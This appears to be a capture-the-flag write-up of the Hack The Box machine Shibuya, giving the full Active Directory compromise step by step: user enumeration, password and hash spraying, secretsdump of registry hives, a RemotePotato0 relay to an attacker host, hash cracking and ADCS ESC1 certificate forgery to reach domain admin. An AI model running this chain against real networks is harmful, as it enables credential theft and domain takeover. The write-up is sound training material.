---
icon: hat-wizard
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 215919.png
coverY: 0
---

# HTB-SHIBUYA(VL)

<figure><img src="../../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

### Initial Reconnaissance

#### Port Scanning

```bash
                                                                                                                                                   
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA]
└─$ rustscan -a 10.129.42.49 blah blah blah
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.129.42.49:22
Open 10.129.42.49:53
Open 10.129.42.49:88
Open 10.129.42.49:135
Open 10.129.42.49:139
Open 10.129.42.49:445
Open 10.129.42.49:464
Open 10.129.42.49:593
Open 10.129.42.49:9389
Open 10.129.42.49:49668
Open 10.129.42.49:49664
Open 10.129.42.49:53956
Open 10.129.42.49:64396
Open 10.129.42.49:64413
Open 10.129.42.49:65433
Open 10.129.42.49:65445


```

**Analysis:** I started with an aggressive full TCP port scan using a high packet rate (10000 packets/second) to quickly identify all open ports. The `-p-` flag scans all 65535 ports, and `-oA` saves output in all formats for later reference.

**Results:** The scan revealed typical Windows Domain Controller ports:

* **Port 22 (SSH):** Unusual for Windows, indicates OpenSSH for Windows
* **Port 88 (Kerberos):** Core authentication protocol for Active Directory
* **Port 135 (RPC):** Remote Procedure Call for Windows services
* **Port 139/445 (SMB):** File sharing and AD communication
* **Port 389/636 (LDAP/LDAPS):** Directory services
* **Port 3389 (RDP):** Remote Desktop
* **Ports 3268/3269:** Global Catalog services
* **High ports (>49000):** Dynamic RPC ports

**Logic:** The combination of Kerberos, LDAP, and high RPC ports strongly indicates this is a Windows Domain Controller.

#### Detailed Service Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ nmap -p 22,53,88,135,139,389,445,464,593,636,3268,3269,3389 -sCV 10.129.42.49 -oA scans/tcpscripts
```

**Analysis:** After identifying open ports, I performed a detailed service scan using:

* `-sC`: Runs default NSE scripts for service detection
* `-sV`: Performs version detection on services

**Key Findings:**

* **Domain:** `shibuya.vl`
* **Hostname:** `AWSJPDC0522.shibuya.vl`
* **OS:** Windows Server 2022 Build 20348
* **LDAPS Certificate:** Revealed domain name in Subject Alternative Name

**Logic:** The service banner information provides critical details about the target environment, including exact OS version and domain structure, which helps in planning exploitation strategies.

***

### Initial Access Vector 1: Machine Account Authentication

#### Step 1: Kerberos Username Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ kerbrute userenum -d shibuya.vl --dc 10.129.42.49 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
```

**Attack Logic:** Kerberos has a username enumeration vulnerability. When you attempt to request a Ticket Granting Ticket (TGT) for a username:

* **Valid username:** Server responds with "PRINCIPAL EXISTS"
* **Invalid username:** Server responds with "PRINCIPAL UNKNOWN"

This allows us to enumerate valid usernames without authentication.

**Results Found:**

* `purple@shibuya.vl`
* `red@shibuya.vl`

**Why This Works:** Active Directory doesn't rate-limit these requests by default, making mass enumeration possible.

#### Step 2: Machine Account Password Spray

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ netexec smb shibuya.vl -u users -p users --no-bruteforce --continue-on-success -k
```

**Attack Logic:** In misconfigured environments, machine accounts sometimes have their password set to their username. The key here is:

* **NTLM authentication fails** for machine accounts (by design)
* **Kerberos authentication works** if username == password
* Using `-k` flag forces Kerberos authentication

**Why Machine Accounts Behave Differently:** Machine accounts (ending with `$`) are computer objects in AD. Unlike user accounts, they:

* Cannot authenticate via NTLM remotely for security
* Use Kerberos for authentication
* Sometimes have weak default passwords in lab environments

**Success:**

```
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\purple:purple
```

***

### Initial Access Vector 2: Service Account Password in Description

#### Step 3: Enumerate AD Users with Valid Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ netexec smb shibuya.vl -k -u red -p red --users
```

**Attack Logic:** With valid credentials (even machine account), we can query Active Directory for:

* All user objects
* User properties (including Description field)
* Password policies
* Group memberships

**Critical Finding in Output:**

```
SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&A6Dw9d8jrKWhV
```

**Why This is a Vulnerability:** The service account `svc_autojoin` has its password stored in the Description field - a common administrative mistake where:

* Admins document service account passwords for reference
* These fields are readable by all authenticated users
* The Description field is not designed for sensitive data storage

**Impact:** We now have credentials for a service account that likely has elevated privileges for domain operations.

***

### Privilege Escalation Stage 1: From Service Account to User

#### Step 4: SMB Share Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ netexec smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --shares
```

**Results:**

```
images$         READ
```

**Logic:** The service account has access to a custom share called `images$` that standard users don't have access to. Custom shares often contain sensitive data or backup files.

#### Step 5: Download WIM Image Files

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ smbclient -U shibuya.vl/svc_autojoin '//shibuya.vl/images$'
smb: \> mget *
```

**Files Retrieved:**

* `AWSJPWK0222-01.wim` (8.2 MB) - User profile backup
* `AWSJPWK0222-02.wim` (50.6 MB) - **Registry hives backup**
* `AWSJPWK0222-03.wim` (32 MB) - Recovery disk image
* `vss-meta.cab` (365 KB) - Volume Shadow Copy metadata

**What are WIM Files:** Windows Imaging Format (WIM) files are:

* Microsoft's disk image format
* Used for Windows deployment and backups
* Can contain entire filesystem snapshots
* Readable with 7zip on Linux

**Why This is Valuable:** WIM files from system backups often contain:

* Registry hives with password hashes
* User profile data
* System configuration files

#### Step 6: Extract Registry Hives

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ 7z l AWSJPWK0222-02.wim | grep -E '(SAM|SECURITY|SYSTEM)'
```

**Logic:** Windows stores password hashes in the SAM (Security Account Manager) registry hive. To decrypt these hashes, we need three files:

* **SAM:** Contains the encrypted password hashes
* **SYSTEM:** Contains the Boot Key (SYSKEY) used to encrypt SAM
* **SECURITY:** Contains LSA secrets and cached credentials

**Extract the hives:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ 7z x AWSJPWK0222-02.wim SAM SYSTEM SECURITY
```

#### Step 7: Dump Password Hashes

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
```

**How This Works:**

1. **Extract Boot Key:** From SYSTEM hive, extract the Boot Key (stored in specific registry keys)
2. **Decrypt SAM:** Use Boot Key to decrypt the SAM database
3. **Extract Hashes:** Pull out NTLM password hashes for local accounts

**Results:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
```

**Additional Important Finding:**

```
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325
```

**What is Cached Credential (DCC2):**

* Windows caches domain credentials locally to allow login when DC is unavailable
* Uses MS-Cache v2 (DCC2) format - much harder to crack than NTLM
* Format: `$DCC2$iterations#username#hash`

**Why This is Significant:** This confirms that `Simon.Watson` is a domain user who has logged into this machine, making them a target for credential reuse.

#### Step 8: Password Hash Spraying

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ netexec smb shibuya.vl -u users -H 5d8c3d1a20bd63f60f469f6763ca0d50 --continue-on-success
```

**Attack Logic - Password Reuse:** The `operator` account is a **local account** on the Domain Controller. However:

* Users often reuse passwords across accounts
* The same person might use the same password for their domain account
* The `operator` hash might match a domain user's password

**Why This Attack Works:**

* We're doing **Pass-the-Hash** - using the NTLM hash directly without cracking it
* Windows authenticates with NTLM hashes, so we don't need the plaintext password
* We spray this hash against all domain users to find matches

**Success:**

```
SMB         10.129.42.49   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50
```

**Impact:** Simon.Watson's domain account uses the same password as the local `operator` account - a clear case of credential reuse.

#### Step 9: SSH Access as Simon.Watson

**Problem:** SSH doesn't support Pass-the-Hash directly.

**Solution:** Upload SSH public key via SMB:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
smb: \simon.watson\> mkdir .ssh
smb: \simon.watson\> put /home/sn0x/keys/ed25519_gen.pub .ssh\authorized_keys
```

**Attack Logic:**

1. SMB allows Pass-the-Hash authentication
2. User home directories are in the `users$` share
3. Windows OpenSSH respects `.ssh/authorized_keys` like Linux
4. By uploading our public key, we can SSH in with our private key

**Connect:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ ssh -i ~/keys/ed25519_gen simon.watson@shibuya.vl
```

**First Flag Captured:**

```
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>type Desktop\user.txt
73531560************************
```

***

### Privilege Escalation Stage 2: Lateral Movement via Session Hijacking

#### Step 10: BloodHound Reconnaissance

```bash
shibuya\simon.watson@AWSJPDC0522 C:\ProgramData>.\SharpHound.exe -c all
```

**What is BloodHound:**

* Tool for analyzing Active Directory relationships
* Maps trust relationships, group memberships, permissions
* Identifies attack paths to Domain Admin

**Critical Finding in BloodHound:**

* **Session Discovery:** `nigel.mills` has an active RDP session on AWSJPDC0522
* **Logged On:** Both simon.watson (us) and nigel.mills are logged in
* **Attack Vector:** Cross-Session Relay Attack possible

**Why Sessions Matter:** When a user is logged into a machine:

* Their credentials are in memory (LSASS process)
* Their session tokens can potentially be stolen
* They can be coerced to authenticate to attackers

#### Step 11: Identify Session IDs

**Problem:** `qwinsta` doesn't work in non-interactive sessions:

```powershell
PS C:\ProgramData> qwinsta *
No session exists for *
```

**Solution:** Use RunasCs with Logon Type 9:

```powershell
PS C:\ProgramData> .\RunasCs.exe whatever whatever qwinsta -l 9
```

**What is Logon Type 9:**

* **NewCredentials logon type**
* Creates a new session without validating credentials
* Used for network authentication with alternate credentials
* Allows us to run commands as if we're authenticated

**Results:**

```
 SESSIONNAME       USERNAME                 ID  STATE   TYPE
 rdp-tcp#0         nigel.mills               1  Active
```

**Key Information:** Nigel.Mills is in session ID 1 via RDP.

#### Step 12: RemotePotato0 Attack Setup

**Attack Overview - RemotePotato0:** This is a sophisticated Windows privilege escalation/lateral movement technique that:

1. Abuses DCOM (Distributed COM) activation service
2. Forces a logged-in user to authenticate
3. Relays that authentication to capture credentials

**Attack Flow:**

```
[Attacker] <-135-> [Socat Relay] <-9999-> [RemotePotato0] -> [Coerce Auth] -> [User Session]
     ↓
[Captured NetNTLMv2 Hash]
```

**Initial Attempt - Firewall Block:**

```powershell
PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.15.153
```

**Problem:** Connection timeout to port 9999

**Firewall Analysis:**

```powershell
PS C:\ProgramData> netsh advfirewall show currentprofile
Domain Profile Settings:
Firewall Policy                       BlockInbound,AllowOutbound
```

**Finding Open Port Range:**

```powershell
PS C:\ProgramData> netsh advfirewall firewall show rule name=all
Rule Name:                            Custom TCP Allow
LocalPort:                            8000-9000
Action:                               Allow
```

**Why Firewall Analysis Matters:**

* Windows Firewall blocks inbound by default on Domain profile
* Custom rules allow specific port ranges
* We need to use a port within the allowed range (8000-9000)

#### Step 13: Execute RemotePotato0 with Port Adjustment

**On Attacker Machine - Setup Relay:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.42.49:8888
```

**What Socat Does:**

* Listens on attacker's port 135 (no firewall restrictions on attacker)
* Forwards all traffic to victim's port 8888 (within allowed range)
* Creates a tunnel bypassing victim's firewall

**On Victim Machine - Execute Attack:**

```powershell
PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.15.153 -p 8888
```

**Parameters Explained:**

* `-m 2`: Mode 2 - Relay authentication and capture hash
* `-s 1`: Target session ID 1 (nigel.mills' RDP session)
* `-x 10.10.15.153`: Attacker IP for RogueOxidResolver
* `-p 8888`: Listen on port 8888 (firewall-allowed)

**Attack Sequence:**

1. RemotePotato0 triggers COM object in nigel.mills' session
2. COM activation causes nigel.mills' session to authenticate
3. Authentication goes to attacker's port 135 (via socat)
4. Socat forwards to RemotePotato0 on port 8888
5. RemotePotato0 captures the NetNTLMv2 hash

**Success:**

```
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:f52be56e934b2cc4:806247512fbce989410edfdc281d07bd:...
```

**What is NetNTLMv2:**

* Network authentication protocol hash
* **Different from NTLM hash** stored in SAM
* Used for challenge-response authentication
* Must be cracked to get plaintext password
* Cannot be used for Pass-the-Hash directly

#### Step 14: Crack NetNTLMv2 Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ hashcat nigel.mills.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Hash Format Auto-Detection:**

```
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
```

**Cracked Result:**

```
NIGEL.MILLS::SHIBUYA:...:Sail2Boat3
```

**Password:** `Sail2Boat3`

**Why This Worked:**

* NetNTLMv2 is crackable (unlike DCC2 which is extremely slow)
* Password was in the rockyou.txt wordlist
* Hashcat efficiently cracks NetNTLMv2 hashes

#### Step 15: SSH as Nigel.Mills

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ sshpass -p 'Sail2Boat3' ssh nigel.mills@shibuya.vl
```

**Impact:** We now have credentials for nigel.mills, who has different permissions than simon.watson.

***

### Privilege Escalation Stage 3: Active Directory Certificate Services (ADCS) Attack

#### Step 16: BloodHound Analysis of Nigel.Mills

**Key Finding:**

* **Group Membership:** nigel.mills is member of `T1_Admins`
* **Certificate Enrollment:** T1\_Admins can enroll in `SHIBUYAWEB` certificate template
* **ESC1 Vulnerability:** Certificate has all requirements for ESC1 exploitation

**What is ESC1 (Escalated Certificate Services #1):** A vulnerability in ADCS where:

1. Certificate template allows **Client Authentication**
2. **Enrollee Supplies Subject** is enabled (user can specify the identity)
3. Certificate has **Any Purpose** or includes authentication EKUs
4. Attacker can enroll in the template

**Impact:** We can request a certificate claiming to be ANY user, including Domain Admin.

#### Step 17: Setup SOCKS Proxy for Certipy

**Why Proxy Needed:** Certipy needs to connect to LDAP (TCP 389), but the firewall blocks direct access.

**Solution:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ ssh -D 1080 -i ~/keys/ed25519_gen nigel.mills@shibuya.vl
```

**What `-D 1080` Does:**

* Creates a SOCKS5 proxy on local port 1080
* All traffic through this proxy gets tunneled through SSH
* Bypasses firewall restrictions

**Configure ProxyChains:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ tail -1 /etc/proxychains.conf
socks5  127.0.0.1 1080
```

#### Step 18: Find ADCS Vulnerabilities

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy find -vulnerable -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -stdout
```

**Attack Logic:** Certipy analyzes:

* All certificate templates in the domain
* Permissions on each template
* Dangerous configurations (ESC1-8)

**Vulnerability Confirmed:**

```
Template Name                       : ShibuyaWeb
Client Authentication               : True
Enrollment Agent                    : True
Any Purpose                         : True
Enrollee Supplies Subject           : True
Enrollment Rights                   : SHIBUYA.VL\t1_admins
[!] Vulnerabilities
      ESC1                              : 'SHIBUYA.VL\\t1_admins' can enroll, enrollee supplies subject and template allows client authentication
```

**Why This is Exploitable:**

1. We're in t1\_admins (via nigel.mills)
2. Can specify any UPN (User Principal Name)
3. Certificate allows authentication
4. No manager approval required

#### Step 19: First Certificate Request Attempt - Key Size Failure

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl
```

**Error:**

```
[-] Got error: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required
```

**Why This Failed:**

* Template requires **minimum 4096-bit RSA key**
* Certipy defaults to 2048-bit
* Modern security best practice requires larger keys

#### Step 20: Certificate Request with Correct Key Size

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
```

**Attempt Failed - Wrong Username:**

```
[-] Got error: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

**Problem:** `administrator` account doesn't exist in this domain.

**Checking BloodHound:** The actual Domain Admin is `_admin`, not `administrator`.

#### Step 21: Correct Certificate Request for \_admin

**First Attempt:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
```

**Success:**

```
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to '_admin.pfx'
```

#### Step 22: Authentication Failure - Missing SID

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
```

**Error:**

```
[-] Object SID mismatch between certificate and user '_admin'
```

**Problem Explanation:**

* Certificates should contain the user's **Object SID** (Security Identifier)
* The certificate we requested doesn't have this embedded
* Kerberos authentication requires matching SIDs for security

**Why SID Matters:**

* SID uniquely identifies security principals in Windows
* Format: `S-1-5-21-DOMAIN_ID-RID`
* Even if UPN matches, SID must also match for authentication
* This prevents impersonation attacks

#### Step 23: Request Certificate with Explicit SID

**Get \_admin's SID from BloodHound:**

```
S-1-5-21-87560095-894484815-3652015022-500
```

**Request Certificate with SID:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
```

**Success:**

```
[*] Successfully requested certificate
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saved certificate and private key to '_admin.pfx'
```

#### Step 24: Authenticate as Domain Admin

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
```

**How Certificate Authentication Works:**

1. Client presents certificate to KDC (Key Distribution Center)
2. KDC validates certificate signature against CA
3. KDC extracts UPN and SID from certificate
4. KDC issues TGT (Ticket Granting Ticket) for that user
5. Client can now use TGT to request service tickets

**Success:**

```
[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```

**What We Got:**

1. **TGT (Ticket Granting Ticket):** Saved as `_admin.ccache`
2. **NTLM Hash:** `bab5b2a004eabb11d865f31912b6b430`

**Why We Get Both:**

* The TGT can be used with Kerberos authentication
* The NTLM hash is extracted via U2U (User-to-User) authentication
* This allows Pass-the-Hash attacks

***

### Final Access: Domain Admin Shell

#### Step 25: WinRM Connection as \_admin

**Check WinRM Availability:**

```powershell
shibuya\nigel.mills@AWSJPDC0522 C:\ProgramData>netstat -ano | findstr LISTENING | findstr 5985
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
```

**WinRM is listening on TCP 5985** (HTTP) but blocked by firewall from external access.

**Solution:** Use ProxyChains through existing SOCKS tunnel:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SHIBUYA] 
└─$ proxychains evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430
```

**How This Works:**

1. Evil-WinRM connects to `127.0.0.1:5985` (localhost)
2. ProxyChains intercepts the connection
3. Traffic routes through SOCKS proxy (SSH tunnel)
4. SSH tunnel delivers traffic to actual WinRM on DC
5. Authentication via Pass-the-Hash with NTLM

**Success:**

```
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Capture Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
5b150cc7************************
```

***

<figure><img src="../../../../.gitbook/assets/complete (36).gif" alt=""><figcaption></figcaption></figure>
